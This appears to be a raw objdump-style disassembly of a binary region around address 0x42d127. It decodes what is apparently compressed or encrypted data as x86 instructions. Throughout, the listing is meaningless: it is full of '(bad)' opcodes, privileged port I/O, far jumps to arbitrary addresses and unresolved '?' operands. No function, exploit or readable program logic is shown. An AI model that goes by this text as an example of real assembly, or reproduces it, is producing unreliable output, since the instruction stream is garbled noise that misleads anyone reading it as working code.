  42d127:	mov    bl,0xbc
  42d129:	pop    esp
  42d12a:	mov    edx,0x84f73bb3
  42d12f:	pop    es
  42d130:	in     eax,0x7c
  42d132:	cli    
  42d133:	add    eax,0x984d7af6
  42d138:	into   
  42d139:	push   0xdddb7c02
  42d13e:	inc    ebx
  42d13f:	out    dx,al
  42d140:	adc    DWORD PTR [ebx],0x17
  42d143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d144:	mov    edx,0xd0253712
  42d149:	cmc    
  42d14a:	jle    0x42d0e2
  42d14c:	sbb    BYTE PTR [edi],0x32
  42d14f:	test   BYTE PTR [edx],ch
  42d151:	cmp    dh,BYTE PTR [eax+0x48]
  42d154:	cmp    BYTE PTR [ebx],ch
  42d156:	or     cl,BYTE PTR [eax+0x32b84a2f]
  42d15c:	repz enter 0xce0,0x67
  42d161:	mov    ebx,?
  42d163:	pop    edi
  42d164:	push   edi
  42d165:	or     BYTE PTR [ebx+esi*1+0xf5b8959],dh
  42d16c:	int3   
  42d16d:	xchg   dh,dl
  42d16f:	sbb    ah,BYTE PTR [ebx]
  42d171:	add    al,0x8c
  42d173:	fld    DWORD PTR [edi-0x29a1a7a6]
  42d179:	nop
  42d17a:	add    ch,BYTE PTR [edi]
  42d17c:	dec    ecx
  42d17d:	test   BYTE PTR [eax],cl
  42d17f:	aam    0x7c
  42d181:	out    0xf,eax
  42d183:	mov    ecx,ebp
  42d185:	and    DWORD PTR [esp+eax*4+0x789e3b0e],ebx
  42d18c:	inc    ecx
  42d18d:	imul   ebp,DWORD PTR [eax+eax*4],0xa79ef93d
  42d194:	mov    BYTE PTR [ecx],al
  42d196:	stc    
  42d197:	fcmovnbe st,st(4)
  42d199:	lea    esi,[ecx+0x4a]
  42d19c:	ins    BYTE PTR es:[edi],dx
  42d19d:	out    dx,al
  42d19e:	pop    esp
  42d19f:	es xchg edi,eax
  42d1a1:	jecxz  0x42d132
  42d1a3:	js     0x42d141
  42d1a5:	outs   dx,BYTE PTR ds:[esi]
  42d1a6:	push   cs
  42d1a7:	sub    al,0xdd
  42d1a9:	cmp    BYTE PTR [edx-0x581d5cb],al
  42d1af:	mov    al,ds:0xb4cb4679
  42d1b4:	mov    edx,0xf4cfd174
  42d1b9:	push   0x9f049e3a
  42d1be:	pop    esi
  42d1bf:	(bad)  
  42d1c1:	cdq    
  42d1c2:	aas    
  42d1c3:	pop    ds
  42d1c4:	push   edx
  42d1c5:	sub    eax,0xc0e8dba2
  42d1ca:	call   FWORD PTR [eax+0x147dbda0]
  42d1d0:	cmp    edi,ebp
  42d1d2:	ror    ebx,0x22
  42d1d5:	push   cs
  42d1d6:	(bad)  
  42d1d7:	xchg   ecx,eax
  42d1d8:	retf   0x23af
  42d1db:	xchg   BYTE PTR [edi-0x7],dl
  42d1de:	stos   DWORD PTR es:[edi],eax
  42d1df:	xchg   edi,eax
  42d1e0:	jb     0x42d19c
  42d1e2:	push   ss
  42d1e3:	jno    0x42d181
  42d1e5:	jl     0x42d24c
  42d1e7:	or     DWORD PTR [edi+0x28203395],esi
  42d1ed:	jecxz  0x42d21e
  42d1ef:	jns    0x42d1e4
  42d1f1:	cmp    DWORD PTR [ebp-0x575bc00c],0x36
  42d1f8:	fdivr  DWORD PTR [eax]
  42d1fa:	and    bl,BYTE PTR [edi]
  42d1fc:	int    0x7f
  42d1fe:	jno    0x42d277
  42d200:	jno    0x42d27b
  42d202:	and    DWORD PTR [ecx-0x5e],esp
  42d205:	xchg   esp,eax
  42d206:	mov    bl,0x91
  42d208:	inc    ebx
  42d209:	mov    dh,0x35
  42d20b:	pop    ebx
  42d20c:	lods   eax,DWORD PTR ds:[esi]
  42d20d:	xchg   ebx,eax
  42d20e:	adc    al,0xe4
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d207
  42d281:	pop    esp
  42d282:	add    BYTE PTR [ecx],al
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	jge    0x42d292
  42d28e:	int3   
  42d28f:	sbb    bh,al
  42d291:	outs   dx,BYTE PTR ds:[esi]
  42d292:	(bad)  
  42d293:	je     0x42d2ef
  42d295:	cwde   
  42d296:	or     eax,0x85639f99
  42d29b:	and    al,0xfc
  42d29d:	hlt    
  42d29e:	adc    ch,BYTE PTR [ebx+0x21]
  42d2a1:	test   DWORD PTR [eax+0x5d],eax
  42d2a4:	xor    BYTE PTR [eax+ecx*2-0x1e],ch
  42d2a8:	retf   0x256d
  42d2ab:	rol    DWORD PTR [ecx],cl
  42d2ad:	inc    edi
  42d2ae:	(bad)  
  42d2af:	stc    
  42d2b0:	iret   
  42d2b1:	or     ecx,DWORD PTR [esi]
  42d2b3:	jo     0x42d2c1
  42d2b5:	inc    esi
  42d2b6:	mov    WORD PTR [esi-0x663f537e],ds
  42d2bc:	push   esp
  42d2bd:	mov    ds:0xf721b28e,al
  42d2c2:	jae    0x42d26f
  42d2c4:	mov    bh,0x89
  42d2c6:	aam    0x21
  42d2c8:	and    DWORD PTR [ebx-0x17],ebx
  42d2cb:	lods   al,BYTE PTR ds:[esi]
  42d2cc:	ds push cs
  42d2ce:	pushf  
  42d2cf:	mov    al,0xb1
  42d2d1:	pop    ss
  42d2d2:	xor    eax,0xe6ec8980
  42d2d7:	cwde   
  42d2d8:	cmc    
  42d2d9:	sub    al,0xcc
  42d2db:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42d2dd:	cdq    
  42d2de:	pushf  
  42d2df:	mov    eax,ds:0x7232dbf3
  42d2e4:	mov    dl,BYTE PTR [edx+esi*4]
  42d2e7:	imul   esp,DWORD PTR [ebp-0x5],0xffffffcd
  42d2eb:	mov    eax,0x2eff5d5b
  42d2f0:	loope  0x42d2b0
  42d2f2:	ins    DWORD PTR es:[edi],dx
  42d2f3:	or     ch,BYTE PTR [edi+0xc]
  42d2f6:	sub    ecx,DWORD PTR [edx-0x5e4e980b]
  42d2fc:	cmp    al,0x5
  42d2fe:	push   ebp
  42d2ff:	dec    eax
  42d300:	adc    BYTE PTR [ebx+0x6f84e330],0xb3
  42d307:	cld    
  42d308:	pop    ds
  42d309:	mov    dh,0x8e
  42d30b:	xchg   DWORD PTR [eax+0x7b],esp
  42d30e:	(bad)  
  42d30f:	(bad)  
  42d310:	adc    eax,0xc2becb08
  42d315:	or     al,0x4d
  42d317:	pusha  
  42d318:	sbb    eax,0xf9367223
  42d31d:	or     bl,BYTE PTR [ebx-0x7ba8be45]
  42d323:	dec    ebx
  42d324:	(bad)  
  42d325:	das    
  42d326:	int    0x6c
  42d328:	jo     0x42d380
  42d32a:	dec    esi
  42d32b:	add    al,0xc1
  42d32d:	push   0x7d3399be
  42d332:	jno    0x42d386
  42d334:	add    ebx,esi
  42d336:	sbb    eax,0x504122b4
  42d33b:	cmp    eax,0xca77fbcd
  42d340:	scas   eax,DWORD PTR es:[edi]
  42d341:	sub    al,0x8b
  42d343:	push   es
  42d344:	ja     0x42d36a
  42d346:	sbb    al,0x2f
  42d348:	pushf  
  42d349:	pop    edi
  42d34a:	pop    ss
  42d34b:	cdq    
  42d34c:	data16 sbb al,0x46
  42d34f:	fsub   DWORD PTR [edx+0x7f4f7f9f]
  42d355:	add    BYTE PTR [ebx+0x7daf721f],ch
  42d35b:	pop    ebp
  42d35c:	es mov esi,0x9cb9c233
  42d362:	loope  0x42d2ff
  42d364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d365:	inc    edi
  42d366:	cwde   
  42d367:	popf   
  42d368:	cmp    dh,al
  42d36a:	sti    
  42d36b:	bnd jnp 0x42d383
  42d36e:	pop    ecx
  42d36f:	int3   
  42d370:	mov    dh,0xdc
  42d372:	iret   
  42d373:	jbe    0x42d34f
  42d375:	mov    ebp,0x57842ce5
  42d37a:	and    cl,BYTE PTR [ebp-0x6002bb47]
  42d380:	sbb    DWORD PTR [esi],edi
  42d382:	push   cs
  42d383:	mov    ecx,0x6413d8f7
  42d388:	es ja  0x42d3cc
  42d38b:	and    al,0x8
  42d38d:	sbb    eax,DWORD PTR [ecx+0xcf]
	...
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	push   esi
  42d401:	push   ebp
  42d402:	push   ss
  42d403:	jb     0x42d419
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	push   0x5976ef16
  42d411:	xor    bh,ch
  42d413:	stos   DWORD PTR es:[edi],eax
  42d414:	cmc    
  42d415:	aad    0x1b
  42d417:	mov    ebp,0xf420b4d7
  42d41c:	call   0x90913adc
  42d421:	mov    esi,0x4c0221f6
  42d426:	ja     0x42d3eb
  42d428:	mov    cl,0x89
  42d42a:	popa   
  42d42b:	push   0xb556738c
  42d430:	cmp    DWORD PTR [edi+0x38],ecx
  42d433:	add    al,0x7
  42d435:	adc    BYTE PTR [ebx-0x2e50f75f],cl
  42d43b:	pop    ss
  42d43c:	push   ebp
  42d43d:	call   0x5ac7:0xa273fe76
  42d444:	cmp    ch,BYTE PTR [ebp-0x3f]
  42d447:	push   cs
  42d448:	stc    
  42d449:	xor    DWORD PTR [ebx+0x75],ebp
  42d44c:	jmp    0x14c2725f
  42d451:	fcmovu st,st(5)
  42d453:	(bad)  [eax-0x7e]
  42d456:	ds push ebp
  42d458:	iret   
  42d459:	jo     0x42d48d
  42d45b:	ds stos BYTE PTR es:[edi],al
  42d45d:	dec    esp
  42d45e:	pop    ebp
  42d45f:	out    dx,al
  42d460:	jge    0x42d4bf
  42d462:	aad    0x90
  42d464:	inc    ebx
  42d465:	xchg   esi,eax
  42d466:	into   
  42d467:	cli    
  42d468:	jae    0x42d40e
  42d46a:	shr    BYTE PTR [eax],0x10
  42d46d:	mov    al,BYTE PTR [ebx+0x27]
  42d470:	out    0xa0,eax
  42d472:	shl    ah,0xe7
  42d475:	jno    0x42d4b2
  42d477:	mov    ch,0x94
  42d479:	xor    cl,BYTE PTR [eax+0x1f92f64f]
  42d47f:	add    eax,DWORD PTR [edx+0x38211fe1]
  42d485:	ret    
  42d486:	dec    edi
  42d487:	mov    edx,0x8f87fd0
  42d48c:	test   cl,cl
  42d48e:	shrd   ebp,esp,cl
  42d491:	xchg   DWORD PTR [edx],ebp
  42d493:	mov    fs,edi
  42d495:	and    eax,0xa7500471
  42d49a:	aaa    
  42d49b:	and    al,0x10
  42d49d:	jp     0x42d4a8
  42d49f:	inc    esi
  42d4a0:	and    eax,0x3ac76adf
  42d4a5:	dec    esi
  42d4a6:	push   0xf6b6e290
  42d4ab:	(bad)  
  42d4ac:	push   ss
  42d4ad:	pop    ds
  42d4ae:	or     al,0x37
  42d4b0:	xchg   edi,eax
  42d4b1:	sbb    DWORD PTR [eax-0xfae70f5],0x66b92d5
  42d4bb:	sbb    esp,esp
  42d4bd:	adc    DWORD PTR [ecx],ebp
  42d4bf:	jl     0x42d527
  42d4c1:	add    dh,bh
  42d4c3:	ja     0x42d4a4
  42d4c5:	dec    edi
  42d4c6:	ficom  WORD PTR [ebx+0x6c09de84]
  42d4cc:	test   DWORD PTR [edi-0x73],edx
  42d4cf:	xor    ebx,DWORD PTR [eax-0x55]
  42d4d2:	inc    edi
  42d4d3:	int3   
  42d4d4:	xor    al,0x31
  42d4d6:	or     BYTE PTR [edi+0x430d26c9],dh
  42d4dc:	sub    BYTE PTR [edx+0x26],cl
  42d4df:	pop    esp
  42d4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4e2:	cld    
  42d4e3:	cs pop es
  42d4e5:	test   al,0x93
  42d4e7:	adc    al,0x62
  42d4e9:	repz push es
  42d4eb:	jge    0x42d4ce
  42d4ed:	pop    ds
  42d4ee:	push   esp
  42d4ef:	shl    DWORD PTR [esi],1
  42d4f1:	cmp    eax,0x49490de9
  42d4f6:	inc    esi
  42d4f7:	jo     0x42d4b3
  42d4f9:	das    
  42d4fa:	shr    BYTE PTR [edi],cl
  42d4fc:	cmp    eax,0xe4f7695e
  42d501:	and    dh,BYTE PTR [ebx+0x17]
  42d504:	cmp    al,0x38
  42d506:	pop    ecx
  42d507:	and    al,0x6a
  42d509:	outs   dx,DWORD PTR ds:[esi]
  42d50a:	cmp    al,0xe4
  42d50c:	and    al,0x5b
  42d50e:	fdiv   st,st(2)
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xcaa252d5,eax
  42d583:	xor    BYTE PTR [eax],bl
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	lods   al,BYTE PTR ds:[esi]
  42d58d:	push   DWORD PTR [ecx]
  42d58f:	mov    ah,0x2
  42d591:	fiadd  WORD PTR [esi+ebx*4]
  42d594:	mov    al,ds:0xf74f76fa
  42d599:	push   ecx
  42d59a:	push   ds
  42d59b:	ret    
  42d59c:	dec    ecx
  42d59d:	hlt    
  42d59e:	mov    al,ds:0x7f603028
  42d5a3:	dec    edi
  42d5a4:	in     eax,dx
  42d5a5:	test   edi,edi
  42d5a7:	in     al,0x5c
  42d5a9:	popa   
  42d5aa:	mov    DWORD PTR [edi+0x54e37bf],eax
  42d5b0:	xlat   BYTE PTR ds:[ebx]
  42d5b1:	outs   dx,DWORD PTR ds:[esi]
  42d5b2:	push   ecx
  42d5b3:	test   eax,0x3e445451
  42d5b8:	in     eax,dx
  42d5b9:	ja     0x42d570
  42d5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5bc:	je     0x42d60d
  42d5be:	dec    esp
  42d5bf:	xor    eax,0x32b18cc5
  42d5c4:	mov    bl,0xee
  42d5c6:	nop
  42d5c7:	or     al,0xbb
  42d5c9:	jnp    0x42d5f5
  42d5cb:	cmp    cl,dh
  42d5cd:	or     dl,ah
  42d5cf:	jmp    0xaa4d:0x23f3872c
  42d5d6:	aaa    
  42d5d7:	imul   edx,DWORD PTR [esp+eiz*2+0x58],0xffffff89
  42d5dc:	or     al,0xc6
  42d5de:	(bad)  
  42d5e0:	jb     0x42d59b
  42d5e2:	pop    ecx
  42d5e3:	mov    bh,0x19
  42d5e5:	ds mov esp,0xa1befbfd
  42d5eb:	out    dx,al
  42d5ec:	test   DWORD PTR [edx+0x36],edx
  42d5ef:	sub    DWORD PTR [eax+ebx*8+0x3d9d82a0],edx
  42d5f6:	xor    eax,0x740910a
  42d5fb:	mov    ch,0x6c
  42d5fd:	fidiv  WORD PTR [edx+0x7048f15]
  42d603:	xor    al,0x91
  42d605:	nop
  42d606:	xchg   ebx,eax
  42d607:	(bad)  
  42d608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d609:	xchg   BYTE PTR [esi+ebx*8+0x1f6f0160],ch
  42d610:	jle    0x42d5f3
  42d612:	jb     0x42d5f0
  42d614:	(bad)  
  42d615:	ss out dx,al
  42d617:	inc    ecx
  42d618:	inc    eax
  42d619:	outs   dx,DWORD PTR ds:[esi]
  42d61a:	test   BYTE PTR [edx-0x14],0x61
  42d61e:	shl    BYTE PTR [edi-0x75d6fc30],0xf7
  42d625:	xchg   DWORD PTR [esi+0x5c8e5a0c],edi
  42d62b:	fnstenv [eax+0x15824813]
  42d631:	dec    edi
  42d632:	dec    ecx
  42d633:	and    al,0xb6
  42d635:	pushf  
  42d636:	inc    ecx
  42d637:	add    eax,0xeb46afd7
  42d63c:	(bad)  
  42d63d:	outs   dx,BYTE PTR ds:[esi]
  42d63e:	out    0xd4,eax
  42d640:	xchg   BYTE PTR [esi-0x78],al
  42d643:	mov    cl,0xc1
  42d645:	inc    ebp
  42d646:	jae    0x42d5e3
  42d648:	in     al,dx
  42d649:	ins    BYTE PTR es:[edi],dx
  42d64a:	mov    ecx,0x580a23c
  42d64f:	or     DWORD PTR [esi+0x2c220b49],ebx
  42d655:	int3   
  42d656:	mov    ?,esi
  42d658:	sub    al,BYTE PTR [ebp+0x5]
  42d65b:	dec    esi
  42d65c:	jg     0x42d65e
  42d65e:	sbb    ebx,esp
  42d660:	push   edx
  42d661:	scas   al,BYTE PTR es:[edi]
  42d662:	sub    BYTE PTR [eax-0x78],0x68
  42d666:	shl    BYTE PTR [eax+0x42],1
  42d669:	pop    ss
  42d66a:	cli    
  42d66b:	dec    ebp
  42d66c:	push   es
  42d66d:	fnstsw WORD PTR [ebx]
  42d66f:	jp     0x42d6e3
  42d671:	jae    0x42d675
  42d673:	loopne 0x42d6b9
  42d675:	pop    ebx
  42d676:	jecxz  0x42d679
  42d678:	ret    0xadb3
  42d67b:	pop    esp
  42d67c:	xor    bh,BYTE PTR [edx]
  42d67e:	xor    edi,DWORD PTR [ebp+0x511b988d]
  42d684:	push   0x15
  42d686:	retf   0x15f1
  42d689:	and    eax,0x3fedde8c
  42d68e:	scas   eax,DWORD PTR es:[edi]
  42d68f:	into   
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x72
  42d701:	lods   eax,DWORD PTR ds:[esi]
  42d702:	cwde   
  42d703:	test   eax,0x1e61c
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	and    ch,BYTE PTR ds:0xd604377a
  42d712:	jb     0x42d69b
  42d714:	(bad)  
  42d715:	mov    ecx,0x520be3d9
  42d71a:	push   esp
  42d71b:	(bad)  
  42d71c:	inc    ecx
  42d71d:	inc    ebp
  42d71e:	(bad)  
  42d71f:	and    BYTE PTR [ebp-0x524c9092],0xbd
  42d726:	xchg   ecx,eax
  42d727:	ficom  WORD PTR [ebx]
  42d729:	int3   
  42d72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d72b:	inc    ebx
  42d72c:	aad    0x25
  42d72e:	ret    0x5f07
  42d731:	test   BYTE PTR [edi-0x5356c7dd],dh
  42d737:	push   ebx
  42d738:	inc    ebp
  42d739:	fidiv  DWORD PTR [eax-0x46]
  42d73c:	lock jnp 0x42d6d4
  42d73f:	mov    ebp,0x79a3168c
  42d744:	dec    esi
  42d745:	lods   eax,DWORD PTR ds:[esi]
  42d746:	mov    edi,0xc030c4e4
  42d74b:	js     0x42d740
  42d74d:	les    esp,FWORD PTR [eax]
  42d74f:	and    DWORD PTR [esi-0x42],edi
  42d752:	(bad)  
  42d753:	or     BYTE PTR [ebp-0x40],ah
  42d756:	push   esi
  42d757:	cwde   
  42d758:	in     eax,dx
  42d759:	push   edx
  42d75a:	mov    al,ds:0x310ce5a6
  42d75f:	js     0x42d7db
  42d761:	test   esi,esi
  42d763:	sbb    eax,0x2e5efe4c
  42d768:	nop
  42d769:	hlt    
  42d76a:	into   
  42d76b:	or     al,0xdf
  42d76d:	xchg   ebp,eax
  42d76e:	dec    esp
  42d76f:	mov    esi,DWORD PTR [ebp-0x44c80ca4]
  42d775:	ins    BYTE PTR es:[edi],dx
  42d776:	dec    edx
  42d777:	mov    ebx,0x391d101c
  42d77c:	das    
  42d77d:	ja     0x42d7e9
  42d77f:	ret    0xdfff
  42d782:	das    
  42d783:	int3   
  42d784:	and    dl,BYTE PTR [eax+0x4e6c4d10]
  42d78a:	mov    edx,0x48d18f0a
  42d78f:	div    DWORD PTR [esi]
  42d791:	xor    eax,DWORD PTR [ecx+0x64651894]
  42d797:	shr    BYTE PTR [ecx-0x7f2408aa],cl
  42d79d:	mov    esp,0x60a4c029
  42d7a2:	lea    ebp,[esi]
  42d7a4:	pop    eax
  42d7a5:	sti    
  42d7a6:	mov    ch,0xb0
  42d7a8:	xchg   ebx,eax
  42d7a9:	push   esp
  42d7aa:	add    bl,cl
  42d7ac:	jmp    0x56380ff7
  42d7b1:	in     al,0x84
  42d7b3:	jmp    FWORD PTR [ebp+0x59c190cd]
  42d7b9:	(bad)  
  42d7ba:	mov    edx,0x97888cb9
  42d7bf:	or     BYTE PTR [edx],dh
  42d7c1:	sub    al,0x24
  42d7c3:	push   ebx
  42d7c4:	or     BYTE PTR [ebx],dl
  42d7c6:	rol    DWORD PTR [ebx],1
  42d7c8:	cmp    BYTE PTR [edi+0x11],0x1
  42d7cc:	inc    esi
  42d7cd:	inc    ebp
  42d7ce:	lds    esp,FWORD PTR [ecx-0x47]
  42d7d1:	dec    esp
  42d7d2:	and    al,0x52
  42d7d4:	push   ebp
  42d7d5:	jo     0x42d7a7
  42d7d7:	inc    ebx
  42d7d8:	addr16 popa 
  42d7da:	ss mov dh,0x36
  42d7dd:	inc    esp
  42d7de:	in     al,dx
  42d7df:	rcr    DWORD PTR ds:0xffb8f67b,cl
  42d7e5:	push   ebp
  42d7e6:	retf   0x2b7d
  42d7e9:	aaa    
  42d7ea:	ja     0x42d836
  42d7ec:	addr16 pop esp
  42d7ee:	daa    
  42d7ef:	jmp    0x42d785
  42d7f1:	or     al,dl
  42d7f3:	fisub  WORD PTR [ebx+0xe]
  42d7f6:	pop    esi
  42d7f7:	out    0x24,eax
  42d7f9:	cmp    eax,0xc8e23054
  42d7fe:	fist   WORD PTR [edx-0xe]
  42d801:	rol    BYTE PTR ds:0x42df2448,1
  42d807:	push   ecx
  42d808:	mov    ds,WORD PTR [eax-0x70]
  42d80b:	dec    ebp
  42d80c:	retf   
  42d80d:	sbb    eax,0xfbdd
	...
  42d872:	add    BYTE PTR [eax],al
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x18c6961a
  42d881:	shl    DWORD PTR [eax+0x49],cl
  42d884:	and    bh,ah
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	or     eax,0x8ce74b2a
  42d891:	push   0x7e
  42d893:	add    eax,0x480fe908
  42d898:	das    
  42d899:	fcom   DWORD PTR [edi]
  42d89b:	xor    dh,BYTE PTR [ecx]
  42d89d:	imul   edx,esp,0x20
  42d8a0:	and    bh,0xb3
  42d8a3:	gs call 0xa47e12bf
  42d8a9:	test   al,0xb3
  42d8ab:	into   
  42d8ac:	cs dec esi
  42d8ae:	out    0xaf,al
  42d8b0:	fst    QWORD PTR [edx]
  42d8b2:	adc    eax,0x8c289e96
  42d8b7:	xor    al,0xb2
  42d8b9:	std    
  42d8ba:	add    eax,0xfbfd1724
  42d8bf:	push   ecx
  42d8c0:	jne    0x42d85a
  42d8c2:	mov    ?,WORD PTR [eax+0x7e0f520c]
  42d8c8:	add    al,0x65
  42d8ca:	xchg   BYTE PTR [edi+0x38],ch
  42d8cd:	out    0x79,al
  42d8cf:	jp     0x42d88d
  42d8d1:	aam    0x2e
  42d8d3:	fld    QWORD PTR [edx-0x7845017b]
  42d8d9:	sub    BYTE PTR [ebp-0x54f898e8],al
  42d8df:	clc    
  42d8e0:	pop    ds
  42d8e1:	mov    cl,0xa7
  42d8e3:	inc    ecx
  42d8e4:	call   0xa6f4:0x51bb65b
  42d8eb:	repz sub al,0x3f
  42d8ee:	mov    edx,0x94fa8490
  42d8f3:	or     al,0xbc
  42d8f5:	cld    
  42d8f6:	inc    ebp
  42d8f7:	stos   BYTE PTR es:[edi],al
  42d8f8:	sub    eax,0xb1c91b3
  42d8fd:	neg    BYTE PTR [ebp-0xab98678]
  42d903:	icebp  
  42d904:	fs jb  0x42d8da
  42d907:	adc    eax,0x2c9670f7
  42d90c:	shl    BYTE PTR [esi-0x29ee873d],cl
  42d912:	sub    BYTE PTR [edx],ch
  42d914:	cmc    
  42d915:	xor    bl,bl
  42d917:	cld    
  42d918:	test   eax,0xbbd8a1f2
  42d91d:	je     0x42d911
  42d91f:	adc    bl,BYTE PTR [eax+0x5f]
  42d922:	xchg   ebx,eax
  42d923:	ja     0x42d8be
  42d925:	mov    ah,0x85
  42d927:	ret    
  42d928:	sbb    eax,0x4acb949b
  42d92d:	into   
  42d92e:	jno    0x42d904
  42d930:	mov    dh,0x1b
  42d932:	ss pop ds
  42d934:	mov    BYTE PTR [eax],0x80
  42d937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d938:	test   edx,esi
  42d93a:	cmp    al,BYTE PTR [ecx-0x4880ddf9]
  42d940:	cdq    
  42d941:	mov    ds:0xb5f9bcb1,al
  42d946:	add    eax,0xacd53e3d
  42d94b:	push   edi
  42d94c:	sbb    BYTE PTR [eax],dl
  42d94e:	lods   al,BYTE PTR ds:[esi]
  42d94f:	ftst   
  42d951:	jl     0x42d96c
  42d953:	jb     0x42d967
  42d955:	sub    al,0x42
  42d957:	sahf   
  42d958:	and    BYTE PTR [edx-0x42],0x19
  42d95c:	loop   0x42d9d9
  42d95e:	pop    ebx
  42d95f:	repnz adc eax,0x65d93d8e
  42d965:	pop    edi
  42d966:	lahf   
  42d967:	popa   
  42d968:	dec    ebx
  42d969:	xchg   esp,eax
  42d96a:	outs   dx,DWORD PTR ds:[esi]
  42d96b:	pop    edx
  42d96c:	rol    DWORD PTR [ecx-0x7205fdc9],1
  42d972:	popf   
  42d973:	jge    0x42d953
  42d975:	and    BYTE PTR [ebp-0x4b],dl
  42d978:	arpl   bp,sp
  42d97a:	jno    0x42d96f
  42d97c:	pop    ebp
  42d97d:	or     DWORD PTR [esi],ecx
  42d97f:	adc    BYTE PTR [ecx+ecx*8],dh
  42d982:	repnz shr BYTE PTR [esi+0x3f],0xb4
  42d987:	and    ah,BYTE PTR [eax]
  42d989:	jmp    0xa976:0x9d9e3c67
	...
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	mov    ebp,0x242126bb
  42da05:	call   0x146da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	arpl   WORD PTR [ebp+ebp*2+0x34ff4ee],ax
  42da13:	int    0x1a
  42da15:	cmp    BYTE PTR [eax+0x2237c3c6],0x66
  42da1c:	in     al,0xee
  42da1e:	add    al,BYTE PTR [ecx-0x3c]
  42da21:	xor    BYTE PTR [edi-0x54b380f3],dh
  42da27:	push   edi
  42da28:	inc    edx
  42da29:	or     eax,0x3eeda84e
  42da2e:	out    0x99,eax
  42da30:	fs jp  0x42d9cb
  42da33:	jmp    0xc6d04e45
  42da38:	fistp  DWORD PTR [ebp-0x45]
  42da3b:	pop    esp
  42da3c:	int    0x51
  42da3e:	xor    al,0x28
  42da40:	stos   BYTE PTR es:[edi],al
  42da41:	jmp    0xf0502ecc
  42da46:	call   0x5af4dceb
  42da4b:	xchg   edx,ecx
  42da4d:	xchg   edx,eax
  42da4e:	sbb    eax,0x8960b471
  42da53:	aad    0x38
  42da55:	scas   eax,DWORD PTR es:[edi]
  42da56:	(bad)  
  42da58:	xor    eax,0xaa7e545e
  42da5d:	dec    edi
  42da5e:	mov    edx,0x205c31b9
  42da63:	lea    edx,[esi+0x4a288a01]
  42da69:	jne    0x42dadf
  42da6b:	(bad)  
  42da6c:	data16 int 0x9b
  42da6f:	lods   al,BYTE PTR ds:[si]
  42da71:	dec    edx
  42da72:	test   DWORD PTR [ebx-0x42],0xef21818a
  42da79:	add    edi,edi
  42da7b:	jmp    0xb7977b2c
  42da80:	aam    0xa2
  42da82:	pop    ss
  42da83:	mov    ch,0x1e
  42da85:	hlt    
  42da86:	hlt    
  42da87:	sbb    eax,esp
  42da89:	call   0x43d2:0x6026a9a0
  42da90:	fld    QWORD PTR [edi-0xc8c6b41]
  42da96:	push   esi
  42da97:	retf   0xda84
  42da9a:	int    0x70
  42da9c:	jno    0x42da1f
  42da9e:	pop    ebp
  42da9f:	in     al,0x97
  42daa1:	mov    ds:0xfd5a7aa,al
  42daa6:	(bad)  
  42daa7:	cmp    eax,edx
  42daa9:	push   ebp
  42daaa:	mov    cs,WORD PTR [edx+ecx*2]
  42daad:	cmp    al,0xf5
  42daaf:	adc    ah,dl
  42dab1:	sbb    BYTE PTR [eax+edx*1+0x55],0x86
  42dab6:	call   FWORD PTR [eax+edi*8]
  42dab9:	mov    edx,0x9315c114
  42dabe:	push   eax
  42dabf:	je     0x42dab0
  42dac1:	xchg   ebx,eax
  42dac2:	fwait
  42dac3:	repnz aas 
  42dac5:	enter  0xfeef,0xa6
  42dac9:	add    ax,0x8f46
  42dacd:	jne    0x42db08
  42dacf:	pop    ss
  42dad0:	pop    es
  42dad1:	mov    dl,0xb7
  42dad3:	stos   DWORD PTR es:[edi],eax
  42dad4:	adc    edi,esi
  42dad6:	icebp  
  42dad7:	adc    BYTE PTR [ebx-0x28],ch
  42dada:	mov    bl,0xa0
  42dadc:	push   edi
  42dadd:	pushf  
  42dade:	ficom  DWORD PTR [ebp+0x7db5d0f3]
  42dae4:	rol    DWORD PTR [ebx+0x5e],1
  42dae7:	jecxz  0x42da84
  42dae9:	push   0xffffff9e
  42daeb:	div    BYTE PTR [ebx-0x22]
  42daee:	push   ss
